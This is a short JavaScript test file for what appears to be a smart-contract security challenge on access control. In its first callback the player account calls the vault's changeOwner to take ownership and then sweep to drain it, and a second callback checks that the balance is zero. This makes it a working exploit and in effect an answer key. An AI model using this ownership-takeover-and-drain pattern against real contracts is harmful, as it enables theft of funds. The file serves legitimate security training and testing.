const { expect } = require("chai");
const { challengeSuite } = require("./harness");
const { at } = require("../lib/artifacts");
const mod = require("../lib/challenges/02-access-control");

challengeSuite(
  mod,
  async ({ signers }, s) => {
    const vault = at(s.contract, s.vault, signers.player);
    await (await vault.changeOwner(signers.player.address)).wait();
    await (await vault.sweep(signers.player.address)).wait();
  },
  async ({ provider, signers }, s) => {
    const vault = at(s.contract, s.vault, signers.deployer);
    await (await vault.sweep(signers.deployer.address)).wait();
    expect(await provider.getBalance(s.vault)).to.equal(0n);
  }
);
